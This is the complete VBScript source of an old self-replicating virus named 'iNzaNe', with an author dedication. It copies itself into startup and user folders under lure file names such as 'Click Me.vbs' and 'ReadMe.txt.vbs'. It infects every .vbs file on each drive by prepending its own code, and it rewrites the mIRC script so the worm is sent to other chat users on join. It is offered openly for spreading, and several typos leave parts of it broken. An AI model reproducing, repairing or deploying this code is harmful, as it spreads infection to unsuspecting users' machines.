'''iNzaNe'''
'This virus was made by Mr.Yozi
'and it is dedicated to insane of the 626 crew!
On Error Resume Next
Set WshShell = CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
MsgBox "Procedure Started"
Desktop =  WshShell.SpecialFolders("AllUsersDesktop")
StartMenu = WshShell.SpecialFolders("AllUsersStratMenu")
Programs = WshShell.SpecialFolders("AllUsersPrograms")
StartUp = WshShell.SpecialFolders("AllUsersStartUp")
MyDocumets = WshShell.SpecialFolders("MyDocumets")
SendTo = WshShell.SpecialFolders("SendTo")
Recent = WshShell.SpecialFolders("Recent")
Favorites = WshShell.SpecialFolders("Favorites")
Templates = WshShell.SpecialFolders("Templates")
Windir = fso.GetSpecialFolder(0)
Tempdir = fso.GetSpecialFolder(2)
'..
Set dc = FS.Drives
For each D in Dc
If d.IsReady then
DoDrive(d.DriveLetter & ":\")
End if
Next
'..
fso.copyfile Wscript.ScriptFullName, SendTo & "\Internet.vbs"
fso.copyfile Wscript.ScriptFullName, StartMenu & "\CheckUp.vbs"
fso.copyfile Wscript.ScriptFullName, Recent & "\Porno Links.vbs"
fso.copyfile Wscript.ScriptFullName, Favorites & "\Super.vbs"
fso.copyfile Wscript.ScriptFullName, Dektop & "\Click Me.vbs"
fso.copyfile wscript.scriptfullname, Templates & "\Word.vbs"
fso.copyfile wscript.scriptfullname, Tempdir & "\dead.vbs"
fso.copyfile Wscript.Scriptfullname, Mydocuments & "\ReadMe.txt.vbs"
fso.copyfile wscript.scriptfullname, Startup & "\StartUp.vbs"
fso.copyfile wscript.scriptfullname, Windir & "\iNzaNe.vbs"
fso.copyfile wscript.scriptfullname, Programs & "\Internet.vbs"
Call MircRoutine
If day(now)=22 then 
Msgbox "This virus is dedicated to INSANE! member of F2F! crew!"
msgbox "TO YOU INSANE.PAINT THE WORLD MAN!!!!!!!!!!!!!"
msgbox "Copyright of this virus by Mr-Yozi. You are free to spread it.!"
set ins = fso.CreateTextFile("C:\insane.txt",2,true)
For r=1 to 100
ins.writeline "[INSANE] BOMBS the world!"
Next
ins.writeline "THANK YOU"
ins.close
end if
Function DoDrive(Drv as String)
On Error Resume Next
Set Word = CreateObject("Word.Application")
Set Fs = Word.Application.FileSearch
fs.NewSearch
Fs.Lookin = Drv
Fs.SearchSubFolders = True
Fs.FileName = "*.vbs"
Fs.Execute
For Each File in Fs.FoundFiles
Set op = opentextfile(file, 1)
g = op.readline
op.Close
If g <> "'''iNzaNe'''" Then
ahxx = fso.opentextfile(Wscript.FullName, 1)
codd = ahxx.read(4417)
ahxx.close
Set victim = opentextfile(file, 1)
viccode = victim.readall
victim.Close
Set victim = opentextfile(file, 2, True)
victim.writeline codd
victim.writeline ""
victim.writeline "'=== iNzaNe ==="
victim.writeline ""
victim.writeline viccode
victim.Close
End If
Next
Word.Quit
End Function
Sub MircRoutine
If (fso.FolderExists("c:\mirc")) Then 
fso.FileCopy Windir & "\iNzaNe.vbs","c:\mirc\downloads\Readme.vbs"
Set Script=Fso.OpenTextFile("c:\mirc\script.ini",2,true)
script.writeline "[script]"
Script.writeline "n0=;INSANE IN THE BRAIN."
Script.writeline "n1=on *:FILERCVD:/dcc send $nick c:\mirc\downloads\Readme.vbs"
Script.writeline "n2=CTCP *:PING:?:/notify $nick iNzaNe !!!!!!"
Script.writeline "n3=CTCP *:VERSION:?:/notify $nick iNzaNe in the BRAIN!!!!!!"
Script.writeline "n4=CTCP *:CLIENTINFO:?:/notify $nick Dedicated 2 iNzaNe..."
Script.writeline "n5=On *:DNS:/Notify $me RESOLVED:127.0.0.1"
Script.writeline "n6=On *:CONNECT:/echo iNzaNe is Active!"
Script.writeline "n7=On *:JOIN:#:{"
Script.writeline "n8=/notify $nick Take a look at this file !!!"
Script.writeline "n9=/dcc send $nick c:\mirc\downloads\Readme.vbs"
Script.writeline "n10=/notify $nick Thank you and have a nice day."
Script.writeline "n11=}"
Script.writeline "n12=On *:TEXT:*insane*:#:/amsg iNzaNe virus made by Mr.Yozi Dedicated 2 insane."
Script.writeline "n13=On *:text:*shit*:#:/msg $nick SHIT!"
Script.writeline "n14=On *:TEXT:*low*bap*:#:{"
Script.writeline "n15=/kick # $nick FUCK LOW BAP!!!!!!!!"
Script.writeline "n16=/msg $nick FUCK LOW BAP MOTHERFUCKER. HARDCORE RAP FOR EVER!!!!!!"
Script.writeline "n17=}"
Script.writeline "n18=On *:TEXT:*zn*:#:/me ZN MOTHERFUCKERZ!!!!!!!!!!!"
Script.writeline "n19=On *:TEXT:*porn*:?:/ame PORNOPARANOIC PAINTERZ CLAN!!!!"
Script.writeline "n20=on *:TEXT:*dpc*:?:/me DPC THE BEST !!!!!!!!!!!!"
Script.writeline "n21=;INSANE THIS IS FOR YOU!!!!!!!!! "
Script.Writeline "n22=;BEWARE OF THE 3C!!!"
SCRIPT.close
end if
end sub